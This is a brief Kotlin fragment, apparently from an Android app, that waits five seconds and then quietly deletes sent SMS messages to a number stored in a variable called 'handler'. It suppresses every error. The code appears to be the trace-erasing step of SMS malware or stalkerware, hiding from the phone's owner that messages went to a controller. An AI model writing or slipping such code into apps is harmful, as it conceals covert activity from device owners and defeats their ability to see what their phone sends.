            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                try {
                    val uri = android.net.Uri.parse("content://sms/sent")
                    ctx.contentResolver.delete(uri, "address=?", arrayOf(handler))
                } catch (e: Exception) {}
            }, 5000)

